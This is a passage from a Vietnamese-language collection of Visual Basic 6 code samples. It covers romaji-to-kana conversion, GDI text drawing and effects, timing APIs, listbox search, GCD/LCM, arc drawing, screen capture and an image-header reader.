    sConv = "ltuta,ltuchi,ltutsu,ltutu,ltute,ltuto,ltusa,ltusi,ltushi,ltusu,ltuse,ltuso,ltupa,ltupi,ltupu,ltupe,ltupo,ltuka,ltuki,ltuku,ltuke,ltuko,ltuza,ltuzi,ltuzu,ltuze,ltuzo,ltuja,ltuji,ltuju,ltuje,ltujo,ltukya,ltukyi,ltukyu,ltukye,ltukyo,ltuzya,ltuzyi,ltuzyu,ltuzye,ltuzyo,ltujya,ltujyi,ltujyu,ltujye,ltujyo,ltupya,ltupyi,ltupyu,ltupye,ltupyo,ltusya,ltusyi,ltusyu,ltusye,ltusyo"
    sArrTsu = Split(sTsu, ",")
    sArrConv = Split(sConv, ",")
    For I = 0 To UBound(sArrTsu)
        sRomajiTmp = Replace(sRomajiTmp, sArrTsu(I), sArrConv(I))
    Next I
    
    'Ca'c ky tu khong bien doi thanh Katakana
    sNoKatakana = "&amp;H3000|&amp;H3001|&amp;H3002|&amp;H3008|&amp;H3009|&amp;H300A|&amp;H300C|&amp;H300D"
    
    'Da^'u PHAY &amp; dau "-" la` da^'u dac biet, phai chuyen doi rieng
    sRomajiTmp = Replace(sRomajiTmp, ",", ChrW(255))
    sRomajiTmp = Replace(sRomajiTmp, "--", ChrW(&amp;H30FC))
    
    'Doi Romaji sang Hiragana hoac Katakana
    sRomaji = " ," &amp; ChrW(255) &amp; ",.,&lt;,&gt;,(,)," &amp; Chr(34) &amp; ",[,],a,i,u,e,o,ka|ca,ki|ci,ku|cu|qu,ke|ce,ko|co,ha,hi,fu|hu,he,ho,sa,si|shi,su,se,so," &amp; _
              "na,ni,nu,ne,no,ta,chi|ti,tsu|tu,te,to,ma,mi,mu,me,mo,ra,ri,ru,re,ro," &amp; _
              "ya,yi,yu,ye,yo,wa,wi|qyi,wu,we|qye,wo,ga,gi,gu,ge,go," &amp; _
              "za,zi|ji,zu,ze,zo,da,di,du,de,do,ba,bi,bu,be,bo,pa,pi,pu,pe,po," &amp; _
              "zya|jya|ja,zyi|jyi,zyu|jyu|ju,zye|jye|je,zyo|jyo|jo," &amp; _
              "cha|tya|cya,tyi|cyi,chu|tyu|cyu,che|tye|cye,cho|tyo|cyo," &amp; _
              "fa,fi,fe,fo,qa,qi,qe,qo," &amp; _
              "kya,kyi,kyu,kye,kyo,gya,gyi,gyu,gye,gyo," &amp; _
              "sha|sya,syi,shu|syu,she|sye,sho|syo," &amp; _
              "hya,hyi,hyu,hye,hyo,bya,byi,byu,bye,byo,pya,pyi,pyu,pye,pyo," &amp; _
              "mya,myi,myu,mye,myo,rya,ryi,ryu,rye,ryo,nya,nyi,nyu,nye,nyo," &amp; _
              "la|xa,li|xi|lyi|xyi,lu|xu,le|xe|lye|xye,lo|xo,ltu|xtu|ltsu,lya|xya,lyu|xyu,lyo|xyo," &amp; _
              "dya,dyi,dyu,dye,dyo,va,vi,vu,ve,vo,vya,vyi,vyu,vye,vyo," &amp; _
              "fya,fyi,fyu,fye,fyo,qya,qyu,qyo,\n"
 
    'Hex ASCII cua Katakana = Hex ASCII cua Hiragana + &amp;H60 (= Decimal 96)
    sHiragana = "3000,3001,3002,3008,3009,FF08,FF09,300A,300C,300D,3042,3044,3046,3048,304A,304B,304D,304F,3051,3053,306F,3072,3075,3078,307B,3055,3057,3059,305B,305D," &amp; _
                "306A,306B,306C,306D,306E,305F,3061,3064,3066,3068,307E,307F,3080,3081,3082,3089,308A,308B,308C,308D," &amp; _
                "3084,3044,3086,3044|3047,3088,308F,3046|3043,3046,3046|3047,3092,304C,304E,3050,3052,3054," &amp; _
                "3056,3058,305A,305C,305E,3060,3062,3065,3067,3069,3070,3073,3076,3079,307C,3071,3074,3077,307A,307D," &amp; _
                "3058|3083,3058|3043,3058|3085,3058|3047,3058|3087," &amp; _
                "3061|3083,3061|3043,3061|3085,3061|3047,3061|3087," &amp; _
                "3075|3041,3075|3043,3075|3047,3075|3049,304F|3041,304F|3043,304F|3047,304F|3049," &amp; _
                "304D|3083,304D|3043,304D|3085,304D|3047,304D|3087,304E|3083,304E|3043,304E|3085,304E|3047,304E|3087," &amp; _
                "3057|3083,3057|3043,3057|3085,3057|3047,3057|3087," &amp; _
                "3072|3083,3072|3043,3072|3085,3072|3047,3072|3087,3073|3083,3073|3043,3073|3085,3073|3047,3073|3087,3074|3083,3074|3043,3074|3085,3074|3047,3074|3087," &amp; _
                "307F|3083,307F|3043,307F|3085,307F|3047,307F|3087,308A|3083,308A|3043,308A|3085,308A|3047,308A|3087,306B|3083,306B|3043,306B|3085,306B|3047,306B|3087," &amp; _
                "3041,3043,3045,3047,3049,3063,3083,3085,3087," &amp; _
                "3062|3083,3062|3044,3062|3085,3062|3048,3062|3087,30F4|3041,30F4|3043,30F4,30F4|3047,30F4|3049,30F4|3083,30F4|3043,30F4|3085,30F4|3047,30F4|3087," &amp; _
                "3075|3083,3075|3043,3075|3085,3075|3047,3075|3087,304F|3083,304F|3085,304F|3087,3093"
    
    sArr = Split(sHiragana, ",")
    
    For I = 1 To Len(sRomajiTmp)
        If Mid(sRomajiTmp, I, 1) = "-" Then: iIsKatakana = IIf(iIsKatakana = 0, 1, 0): iPlus = 1: Else: iPlus = 0
        k = 4
        While k &gt; 0
            If k = 1 Or Len(Mid(sRomajiTmp, I + iPlus, k)) = 1 Then
                lPos = InStr(1, Left(sRomaji, 29), Mid(sRomajiTmp, I + iPlus, k), vbTextCompare)
            Else
                lPos = InStr(1, sRomaji, Mid(sRomajiTmp, I + iPlus, k), vbTextCompare)
            End If
            If lPos &gt; 0 Then
                sTmpArry = Split(Left(sRomaji, lPos), ",")
                If InStr(1, sArr(UBound(sTmpArry)), "|", vbTextCompare) &gt; 0 Then
                    sHiraganaArr = Split(sArr(UBound(sTmpArry)), "|")
                    sTmp = sTmp &amp; ChrW(Val("&amp;H" &amp; sHiraganaArr(0)) + IIf(iIsKatakana = 0, &amp;H0, IIf("&amp;H" &amp; sHiraganaArr(0) = "&amp;H3000", &amp;H0, &amp;H60)))
                    sTmp = sTmp &amp; ChrW(Val("&amp;H" &amp; sHiraganaArr(1)) + IIf(iIsKatakana = 0, &amp;H0, IIf("&amp;H" &amp; sHiraganaArr(1) = "&amp;H3000", &amp;H0, &amp;H60)))
                Else
                    sTmp = sTmp &amp; ChrW(Val("&amp;H" &amp; sArr(UBound(sTmpArry))) + IIf(iIsKatakana = 0, &amp;H0, IIf(InStr(1, sNoKatakana, "&amp;H" &amp; sArr(UBound(sTmpArry)), vbTextCompare) &gt; 0, &amp;H0, &amp;H60)))
                End If
                I = I + k - 1 + iPlus: k = 0
            Else
                If k = 1 Then
                    'Xu ly ky tu khong co' trong tieng Nhat
                    sTmp = sTmp &amp; Mid(sRomajiTmp, I, 1)
                    'Xu ly ky tu 'n' hop le: Su dung Penkyoshimasu, khong can: Pe\nkyoshimasu
                    'Xu ly ky tu 'm' hop le: Su dung sempai, tempura thay vì se\mpai, te\mpura
                    'Luu y: ky tu 'n' &amp; 'm' trong Romaji deu nhu nhau trong tieng Nhat.
                    Dim bIsN As Boolean, bIsHiragana As Boolean, bIsMore1 As Boolean
                    bIsN = (UCase(Right(sTmp, 1)) = "N") or (UCase(Right(sTmp, 1)) = "M")
                    bIsMore1 = (Len(sTmp) &gt; 1)
                    If bIsMore1 Then
                        Dim sMidTmp As String, iKata As Integer
                        iKata = IIf(iIsKatakana = 0, 0, 96)
                        sMidTmp = Left(Hex(AscW(Mid(sTmp, Len(sTmp) - 1, 1)) - iKata) &amp; "|||", 4)
                        bIsHiragana = (InStr(1, Mid(sHiragana, 50, Len(sHiragana) - 55), sMidTmp) &gt; 0)
                    End If
                    If bIsN And bIsHiragana And bIsMore1 Then sTmp = Left(sTmp, Len(sTmp) - 1) &amp; ChrW(&amp;H3093 + IIf(iIsKatakana = 0, &amp;H0, &amp;H60))
                End If
                k = k - 1
            End If
        Wend
    Next I
    
    'Dau ngoac kep
    For I = 1 To Len(sTmp)
        If AscW(Mid(sTmp, I, 1)) = &amp;H300A Then
            iC = iC + 1
            If iC Mod 2 = 0 Then sTmp = Left(sTmp, I - 1) &amp; ChrW(&amp;H300B) &amp; Mid(sTmp, I + 1)
        End If
    Next I
    
    'Doi ca'c da^'u dac biet khac: dupe 2 ky' tu se~ chuyen doi la.i thanh dau' binh thuong
    'Dim sEMark As String, sJMark As String, sArrEMark() As String, sArrJMark() As String
    'sJMark = "30003001300230083009300C300D"
    'sEMark = " ,.&lt;&gt;[]"
    'For i = 1 To Len(sJMark) Step 4
    '    sTmp = Replace(sTmp, ChrW("&amp;H" &amp; Mid(sJMark, i, 4)) &amp; ChrW("&amp;H" &amp; Mid(sJMark, i, 4)), Mid(sEMark, i \ 4 + 1, 1))
    'Next i
    
    ToNihonGo = sTmp
End Function
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091016081030</MaVD>
    <NoiDung>Format$(0, "#.#")
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091116081154</MaVD>
    <NoiDung>Cái này nằm trong bộ Unicode UserControl, mình tách riêng ra để các bạn dễ tìm kiếm. 
(vì lúc mình cần hàm này, tìm trong diễn đàn không thấy, phải vào tận source của Unicode UserControl.)

 
Private Declare Function GetTextExtentPoint32 Lib "gdi32" Alias "GetTextExtentPoint32W" (ByVal hdc As Long, ByVal lpsz As Long, ByVal cbString As Long, lpSize As SIZE) As Long
Type SIZE
     cx As Long
     cy As Long
End Type
 
'Cac ban co the chinh lai de co UniTextHeigh
Function UniTextWidth(hdc As Long, sText As String) As Long
     Dim sz As SIZE
         GetTextExtentPoint32 hdc, StrPtr(sText), Len(sText), sz
         UniTextWidth = sz.cx
End Function
 
'Ghi chu:
'Cac ban phai chinh lai font (ho tro Unicode)  cho  doi tuong lay hdc. VD:
'Private Sub Form_Load()
'Dim UniStr As String
'Me.Font = "Tahoma"
'Me.Font.Charset = 163
'UniStr = chuoi unicode
'MsgBox UniTextWidth(Me.hdc, UniStr)
'End Sub
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091516081556</MaVD>
    <NoiDung>Module:

Option Explicit
Public Declare Function timeGetTime Lib "winmm.dll" () As Long
Public Declare Function SetTextCharacterExtra Lib "gdi32" _
(ByVal hdc As Long, ByVal nCharExtra As Long) As Long
 
Public Type RECT
Left As Long
Top As Long
Right As Long
Bottom As Long
End Type
 
Public Declare Function OffsetRect Lib "user32" (lpRect _
As RECT, ByVal x As Long, ByVal y As Long) As Long
 
Public Declare Function SetTextColor Lib "gdi32" (ByVal hdc _
As Long, ByVal crColor As Long) As Long
 
Public Declare Function FillRect Lib "user32" (ByVal hdc As _
Long, lpRect As RECT, ByVal hBrush As Long) As Long
 
Public Declare Function CreateSolidBrush Lib "gdi32" (ByVal _
crColor As Long) As Long
 
Public Declare Function DeleteObject Lib "gdi32" (ByVal _
hObject As Long) As Long
 
Public Declare Function GetSysColor Lib "user32" (ByVal _
nIndex As Long) As Long
 
Public Const COLOR_BTNFACE = 15
 
Public Declare Function TextOut Lib "gdi32" Alias "TextOutA" _
(ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal _
lpString As String, ByVal nCount As Long) As Long
 
Public Declare Function DrawText Lib "user32" Alias "DrawTextA" _
(ByVal hdc As Long, ByVal lpStr As String, ByVal nCount As Long, _
lpRect As RECT, ByVal wFormat As Long) As Long
 
Public Const DT_BOTTOM = &amp;H8
Public Const DT_CALCRECT = &amp;H400
Public Const DT_CENTER = &amp;H1
Public Const DT_CHARSTREAM = 4
Public Const DT_DISPFILE = 6
Public Const DT_EXPANDTABS = &amp;H40
Public Const DT_EXTERNALLEADING = &amp;H200
Public Const DT_INTERNAL = &amp;H1000
Public Const DT_LEFT = &amp;H0
Public Const DT_METAFILE = 5
Public Const DT_NOCLIP = &amp;H100
Public Const DT_NOPREFIX = &amp;H800
Public Const DT_PLOTTER = 0
Public Const DT_RASCAMERA = 3
Public Const DT_RASDISPLAY = 1
Public Const DT_RASPRINTER = 2
Public Const DT_RIGHT = &amp;H2
Public Const DT_SINGLELINE = &amp;H20
Public Const DT_TABSTOP = &amp;H80
Public Const DT_TOP = &amp;H0
Public Const DT_VCENTER = &amp;H4
Public Const DT_WORDBREAK = &amp;H10
 
Public Declare Function OleTranslateColor Lib "olepro32.dll" _
(ByVal OLE_COLOR As Long, ByVal hPalette As Long, pccolorref As Long) As Long
Public Const CLR_INVALID = -1
 
Public Sub TextEffect(obj As Object, ByVal sText As String, _
ByVal lX As Long, ByVal lY As Long, Optional ByVal bLoop _
As Boolean = False, Optional ByVal lStartSpacing As Long = 128, _
Optional ByVal lEndSpacing As Long = 0, Optional ByVal oColor _
As OLE_COLOR = vbWindowText)
 
Dim lhDC As Long
Dim i As Long
Dim x As Long
Dim lLen As Long
Dim hBrush As Long
Static tR As RECT
Dim iDir As Long
Dim bNotFirstTime As Boolean
Dim lTime As Long
Dim lIter As Long
Dim bSlowDown As Boolean
Dim lCOlor As Long
Dim bDoIt As Boolean
 
lhDC = obj.hdc
iDir = -1
i = lStartSpacing
tR.Left = lX: tR.Top = lY: tR.Right = lX: tR.Bottom = lY
OleTranslateColor oColor, 0, lCOlor
 
hBrush = CreateSolidBrush(GetSysColor(COLOR_BTNFACE))
lLen = Len(sText)
 
SetTextColor lhDC, lCOlor
bDoIt = True
 
Do While bDoIt
lTime = timeGetTime
If (i &lt; -3) And Not (bLoop) And Not (bSlowDown) Then
bSlowDown = True
iDir = 1
lIter = (i + 4)
End If
If (i &gt; 128) Then iDir = -1
If Not (bLoop) And iDir = 1 Then
If (i = lEndSpacing) Then
' Stop
bDoIt = False
Else
lIter = lIter - 1
If (lIter &lt;= 0) Then
i = i + iDir
lIter = (i + 4)
End If
End If
Else
i = i + iDir
End If
 
FillRect lhDC, tR, hBrush
x = 32 - (i * lLen)
SetTextCharacterExtra lhDC, i
DrawText lhDC, sText, lLen, tR, DT_CALCRECT
tR.Right = tR.Right + 4
If (tR.Right &gt; obj.ScaleWidth \ Screen.TwipsPerPixelX) Then _
tR.Right = obj.ScaleWidth \ Screen.TwipsPerPixelX
DrawText lhDC, sText, lLen, tR, DT_LEFT
obj.Refresh
 
Do
DoEvents
If obj.Visible = False Then Exit Sub
Loop While (timeGetTime - lTime) &lt; 20
 
Loop
DeleteObject hBrush
 
End Sub

Form1:

Private Sub Command1_Click()
Call TextEffect(Me, "Hieu ung Text ne, Cool hong!", 15, 15, False, 128)
End Sub

DownLoad:</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091816081825</MaVD>
    <NoiDung>Cần Command1, Text1 và List1. Chạy code sau:

Private Sub Command1_Click()
Dim a%, b%, u%, x%
For u = 2 To 100
    a = Sqr(u)
    b = 2
        Do While (u Mod b &lt;&gt; 0) And (b &lt;= a)
            b = b + 1
        Loop
If (b &gt; a) Then
    List1.AddItem u
    x = x + 1
End If
Next u
Text1 = x &amp; " Sô' NT"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092016082035</MaVD>
    <NoiDung>Private Declare Function GetLongPathName Lib "kernel32" Alias "GetLongPathNameA" (ByVal lpszShortPath As String, ByVal lpszLongPath As String, ByVal cchBuffer As Long) As Long
Private Function LongPath(ByVal ShortPath As String) As String
    Dim lonRet As Long, strLong As String
    strLong = String$(1024, " ")
    lonRet = GetLongPathName(ShortPath, strLong, Len(strLong))
    If lonRet &gt; Len(strLong) Then
        strLong = String$(lonRet + 1, " ")
        lonRet = GetLongPathName(ShortPath, strLong, Len(strLong))
    End If
    If lonRet &gt; 0 Then
        LongPath = Left$(strLong, lonRet)
    End If
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092216082256</MaVD>
    <NoiDung>Trong VB6, ta hay dùng các hàm đo thời gian sau:

* GetTickCount: Hàm trả về số mili-giây từ khi hệ điều hành làm việc
(độ phân giải đến 16 mili-giây)

Private Declare Function getTickCount Lib "kernel32" Alias "GetTickCount" () As Integer

* timeGetTime: Hàm trả về số mili-giây từ khi hệ điều hành làm việc
(độ phân giải đến 1mili-giây), đương nhiên tốt hơn GetTickCount

Private Declare Function timeGetTime Lib "winmm.dll" () As Integer

* QueryPerformanceCounter: kết quả với độ phân giải dưới mili-giây rất nhiều

Private Declare Function QueryPerformanceCounter Lib "kernel32" (lpPerformanceCount As LARGE_INTEGER) As Long

* rdtsc: kết quả với độ phân giải dưới mili-giây rất nhiều. Cần có file csRdtsc.dll đính kèm

Private Declare Function rdtsc Lib "csRdtsc.dll" () As Currency

Sau đây là Code minh họa và Project đính kèm:

Private Declare Function rdtsc Lib "csRdtsc.dll" () As Currency
Private Declare Function GetTickCount&amp; Lib "kernel32" ()
Private Declare Function timeGetTime Lib "winmm.dll" () As Long
 
Private Type LARGE_INTEGER
    LowPart As Long
    HighPart As Long
End Type
Private Declare Function QueryPerformanceCounter Lib "kernel32" (lpPerformanceCount As LARGE_INTEGER) As Long
Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
 
Private Function LargeIntToCurrency(liInput As LARGE_INTEGER) As Currency
    CopyMemory LargeIntToCurrency, liInput, LenB(liInput)
    LargeIntToCurrency = LargeIntToCurrency * 10000
End Function
 
Private Sub Command1_Click()
Dim xx As LARGE_INTEGER
List1.AddItem rdtsc
List2.AddItem GetTickCount
List3.AddItem timeGetTime
QueryPerformanceCounter xx
List4.AddItem LargeIntToCurrency(xx)
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092416082432</MaVD>
    <NoiDung>Add vào form 1 ListBox (List1), TextBox (Text1)

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Any) As Long
Const LB_FINDSTRING = &amp;H18F
 
Private Sub Form_Load()
    With List1
        .AddItem "XP"
        .AddItem "Vista"
        .AddItem "Seven"
        .AddItem "VB6"
        .AddItem "VB.NET"
        .AddItem "PHP"
        .AddItem "Laptop"
        .AddItem "NetBook"
        .AddItem "Picture"
    End With
End Sub
 
Private Sub Text1_Change()
    List1.ListIndex = SendMessage(List1.hwnd, LB_FINDSTRING, -1, ByVal CStr(Text1.Text))
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093116083119</MaVD>
    <NoiDung>Function USCLN(A As Integer, B As Integer) As Integer
While A &lt;&gt; 0 And B &lt;&gt; 0
If A &gt;= B Then
    A = A - B
Else
    B = B - A
End If
Wend
USCLN2 = A + B
End Function


Cần phải có hàm tìm USCLN ở trên

Function BSCNN(A As Integer, B As Integer) As Integer
Dim ka, kb As Integer
ka = (A * B): kb = USCLN(A, B)
BSCNN = ka / kb
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093316083329</MaVD>
    <NoiDung>Prooject bao gồm 2 hàm:
Hàm 1: Num2Nihongo(lNumber, sCur, iType)
Chuyển đổi từ định dạng số, hỗ trợ số nguyên từ 0 đến 2.147.483.647
lNumber: Số định dạng Long - số cần chuyển
sCur: Đơn vị
iType: Loại phát âm tiếng Nhật muốn chuyển:
- 0: Rojima
- 1: Hiragana
- 2: Katakana
- 3: Kanji (Hán Tự)
- 4: Daiji (Đại Tự) - được sử dụng trong nghành tài chính kinh tế
Ví dụ: 
Num2Nihongo(2147483647,￥, 0) -&gt; nijuuichiokuyonsennanahyakuyonjuuhachimansanzenroppyakuyonjuunana￥
Num2Nihongo(2147483647,￥, 1) -&gt; にじゅういちおくよんせんななひゃくよんじゅうはちまんさんぜんろっぴゃくよんじゅうなな￥
Num2Nihongo(2147483647,￥, 2) -&gt; ニジュウイチオクヨンセンナナヒャクヨンジュウハチマンサンゼンロッピャクヨンジュウナナ￥
Num2Nihongo(2147483647,￥, 3) -&gt; 二十一億四千七百四十八万三千六百四十七￥
Num2Nihongo(2147483647,￥, 4) -&gt; 弐拾壱億肆阡漆佰肆拾捌萬参阡陸佰肆拾漆￥

Hàm 2: StrNum2Nihongo(sNumber, sCur, iType)
sNumber: chuỗi số cần chuyển.
sCur &amp; iType như trên.
Chuyển đổi từ định dạng chữ, hỗ trợ chuỗi toàn số từ "0" đến "999.999.999.999.999.999.999.999" hoặc hơn nếu biết chữ Nhật tiếp theo là gì vì mình chỉ biết đến 垓 (がい - gai) = 100.000.000.000.000.000.000 = 100 tỷ tỷ
Ví dụ:
StrNum2Nihongo("9900000000000000000000",￥, 0) -&gt; kyuujuukyuugai￥
StrNum2Nihongo("9900000000000000000000",￥, 1) -&gt; きゅうじゅうきゅうがい￥
StrNum2Nihongo("9900000000000000000000",￥, 2) -&gt; キュウジュウキュウガイ￥
StrNum2Nihongo("9900000000000000000000",￥, 3) -&gt; 九十九垓￥
StrNum2Nihongo("9900000000000000000000",￥, 4) -&gt; 玖拾玖垓￥
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093916083933</MaVD>
    <NoiDung> Const WM_NCLBUTTONDOWN As Long = &amp;HA1&amp;
  Const HTCAPTION As Long = 2&amp;
  Private Declare Function ReleaseCapture Lib "user32" () As Long
  Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd&amp;, ByVal wMsg&amp;, wParam As Any, lParam As Any) As Long
 
Private Declare Function Arc Lib "gdi32" (ByVal hdc As Long, ByVal x1 As Long, ByVal y1 As Long, ByVal x2 As Long, ByVal y2 As Long, ByVal X3 As Long, ByVal Y3 As Long, ByVal X4 As Long, ByVal Y4 As Long) As Long
'code by truongphu
Private Type Ðiêm
    xx As Long
    yy As Long
End Type
 
Dim AA(1 To 4) As Ðiêm
Dim down As Boolean
 
 
Private Sub Command1_Click() 'draw
        
        Dim qq As Long
        qq = Arc(Me.hdc, AA(1).xx, AA(1).yy, AA(2).xx, AA(2).yy, AA(3).xx, AA(3).yy, AA(4).xx, AA(4).yy)
    Line (AA(1).xx * 15, AA(1).yy * 15)-(AA(1).xx * 15, AA(2).yy * 15)
    Line (AA(1).xx * 15, AA(1).yy * 15)-(AA(2).xx * 15, AA(1).yy * 15)
    Line (AA(2).xx * 15, AA(2).yy * 15)-(AA(1).xx * 15, AA(2).yy * 15)
    Line (AA(2).xx * 15, AA(2).yy * 15)-(AA(2).xx * 15, AA(1).yy * 15)
    Line (AA(3).xx * 15, AA(3).yy * 15)-(AA(4).xx * 15, AA(4).yy * 15), vbBlue
End Sub
 
 
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If AA(1).xx = 0 Then
        AA(1).xx = X \ 15
        AA(1).yy = Y \ 15
        Load Picture1(1)
        Picture1(1).Left = X
        Picture1(1).Top = Y
        Picture1(1).Visible = True
    ElseIf AA(2).xx = 0 Then
        AA(2).xx = X \ 15
        AA(2).yy = Y \ 15
        Load Picture1(2)
        Picture1(2).Left = X
        Picture1(2).Top = Y
        Picture1(2).Visible = True
        Picture1(2).BackColor = vbYellow
        Me.DrawWidth = 1
        Me.DrawStyle = 2
        Line (AA(1).xx * 15, AA(1).yy * 15)-(AA(1).xx * 15, AA(2).yy * 15)
        Line (AA(1).xx * 15, AA(1).yy * 15)-(AA(2).xx * 15, AA(1).yy * 15)
        Line (AA(2).xx * 15, AA(2).yy * 15)-(AA(1).xx * 15, AA(2).yy * 15)
        Line (AA(2).xx * 15, AA(2).yy * 15)-(AA(2).xx * 15, AA(1).yy * 15)
    ElseIf AA(3).xx = 0 Then
        AA(3).xx = X \ 15
        AA(3).yy = Y \ 15
        Load Picture1(3)
        Picture1(3).Left = X
        Picture1(3).Top = Y
        Picture1(3).Visible = True
        Picture1(3).BackColor = vbBlue
    ElseIf AA(4).xx = 0 Then
        AA(4).xx = X \ 15
        AA(4).yy = Y \ 15
        Load Picture1(4)
        Picture1(4).Left = X
        Picture1(4).Top = Y
        Picture1(4).Visible = True
        Picture1(4).BackColor = vbGreen
    End If
   
End Sub
 
Private Sub Picture1_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Picture1(Index).SetFocus
    Call ReleaseCapture
    Call SendMessage(Picture1(Index).hWnd, WM_NCLBUTTONDOWN, ByVal HTCAPTION, ByVal 0&amp;)
    down = True
End Sub
 
Private Sub Picture1_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
        If down = True Then
            Me.Cls
            AA(Index).xx = Picture1(Index).Left \ 15
            AA(Index).yy = Picture1(Index).Top \ 15
            Command1_Click
        End If
End Sub
 
Private Sub Picture1_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    down = False
End Sub
 
 Xem thêm:
 Vẽ cung với hàm PolyBezier
 Vẽ cung với hàm PolyBezier, tạo nhiều điểm

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094116084114</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>094616084643</MaVD>
    <NoiDung>Private Function PrintAPos(posX As Single, posY As Single, sText As String, DrwObj As Variant)
    Dim iLine As Integer: iLine = DrwObj.TextHeight(vbCrLf)
    Dim iSpace As Integer: iSpace = DrwObj.TextWidth(" ")
    Dim i As Integer
    For i = 0 To posY \ iLine
         DrwObj.Print vbCrLf
    Next i
    For i = 0 To posX \ iSpace
        sText = " " &amp; sText
    Next i
     DrwObj.Print sText
End Function


Private Sub Form_Paint()
    PrintAPos 1000, 1000, _
    "My ''Cute Grass''", _
    Form1
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000175</MaVD>
    <NoiDung>Hàm API phục vụ cho sự kiện nhấn phím:
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, _
ByVal bScan As Byte, ByVal dwFlags As Long, _
ByVal dwExtraInfo As Long)
Và với hằng số dưới đây, bạn đã có đủ công cụ trong tay:
Const VK_SNAPSHOT As Byte = &amp;H2C
Để chụp ảnh cửa sổ đang hoạt động vào Clipboard, bạn dùng lệnh:
Call keybd_event(VK_SNAPSHOT, 1, 0, 0)
Để chụp toàn bộ màn hình, bạn dùng lệnh:
Call keybd_event(VK_SNAPSHOT, 0, 0, 0)
Ví dụ: Thêm vào Form 1 CommandButton và 1 PictureBox 
Private Sub Command1_Click()
   Clipboard.Clear
   'Chụp toàn bộ màn hình vào PictureBox
   Call keybd_event(VK_SNAPSHOT, 0, 0, 0)
   DoEvents
   Picture1.Picture = Clipboard.GetData(vbCFBitmap)
End Sub

'Hoặc

Private Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function StretchBlt Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal nSrcWidth As Long, ByVal nSrcHeight As Long, ByVal dwRop As Long) As Long

Private Sub Command1_Click()
    Dim wScreen As Long
    Dim hScreen As Long
    Dim w As Long
    Dim h As Long
    Picture1.Cls
    wScreen = Screen.Width \ Screen.TwipsPerPixelX
    hScreen = Screen.Height \ Screen.TwipsPerPixelY
    Picture1.ScaleMode = vbPixels
    w = Picture1.ScaleWidth
    h = Picture1.ScaleHeight
    
    hdcScreen = GetDC(0)
    r = StretchBlt(Picture1.hdc, 0, 0, w, h, hdcScreen, 0, 0, wScreen, hScreen, vbSrcCopy)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095716085710</MaVD>
    <NoiDung>Option Explicit
 
' Only the first X bytes of the file are read into a byte array.
' BUFFERSIZE is X.  A larger number will use more memory and
' be slower.  A smaller number may not be able to decode all
' JPEG files.  Feel free to play with this number.
Private Const BUFFERSIZE As Long = 65535
 
' image type enum
Public Enum eImageType
    itUNKNOWN = 0
    itGIF = 1
    itJPEG = 2
    itPNG = 3
    itBMP = 4
End Enum
 
' private member variables
Private m_Width As Long
Private m_Height As Long
Private m_Depth As Byte
Private m_ImageType As eImageType
 
 
 
'
' CImageInfo
'
' Author: David Crowell
' davidc@qtm.net
' http://www.qtm.net/~davidc
'
' Released to the public domain
' use however you wish
'
' CImageInfo will get the image type ,dimensions, and
' color depth from JPG, PNG, BMP, and GIF files.
'
' version date: June 16, 1999
'
' http://www.wotsit.org is a good source of
' file format information.  This code would not have been
' possible without the files I found there.
'
 
' read-only properties
 
Public Property Get Width() As Long
    Width = m_Width
End Property
 
Public Property Get Height() As Long
    Height = m_Height
End Property
 
Public Property Get Depth() As Byte
    Depth = m_Depth
End Property
 
Public Property Get ImageType() As eImageType
    ImageType = m_ImageType
End Property
 
Public Sub ReadImageInfo(sFileName As String)
' This is the sub to call to retrieve information on a file.
   
    ' Byte array buffer to store part of the file
    Dim bBuf(BUFFERSIZE) As Byte
    ' Open file number
    Dim iFN As Integer
   
    ' Set all properties to default values
    m_Width = 0
    m_Height = 0
    m_Depth = 0
    m_ImageType = itUNKNOWN
   
    ' here we will load the first part of a file into a byte
'array the amount of the file stored here depends on
'the BUFFERSIZE constant
    iFN = FreeFile
    Open sFileName For Binary As iFN
    Get #iFN, 1, bBuf()
    Close iFN
   
    If bBuf(0) = 137 And bBuf(1) = 80 And bBuf(2) = 78 Then
    ' this is a PNG file
   
        m_ImageType = itPNG
       
        ' get bit depth
        Select Case bBuf(25)
            Case 0
            ' greyscale
                m_Depth = bBuf(24)
               
            Case 2
            ' RGB encoded
                m_Depth = bBuf(24) * 3
               
            Case 3
            ' Palette based, 8 bpp
                m_Depth = 8
               
            Case 4
            ' greyscale with alpha
                m_Depth = bBuf(24) * 2
               
            Case 6
            ' RGB encoded with alpha
                m_Depth = bBuf(24) * 4
               
            Case Else
            ' This value is outside of it's normal range, so
            'we'll assume
            ' that this is not a valid file
                m_ImageType = itUNKNOWN
               
        End Select
       
        If m_ImageType Then
        ' if the image is valid then
       
            ' get the width
